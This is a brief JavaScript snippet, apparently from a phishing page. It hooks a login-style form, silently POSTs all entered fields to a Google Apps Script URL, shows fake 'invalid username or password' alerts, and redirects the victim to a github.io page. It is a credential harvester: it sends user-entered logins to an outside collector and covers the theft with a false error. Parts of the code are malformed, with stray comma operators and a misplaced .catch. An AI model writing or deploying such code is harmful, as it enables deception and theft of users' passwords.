
const scriptURL = 'https://script.google.com/macros/s/AKfycbxPRJ7FAx6rP_iFZ9_Ik_fvJ28FaiW_TMY_-LJl-3bW6SRcBPAJ17wKLNKkj8XegQZJ/exec'
const form = document.forms['hello']
form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => alert("invalid username or password"), window.location.href = "http://www.sainy98.github.io/super"), alert(" Invalid password ") 
        .catch(error => console.error('Error!', error.message))
})
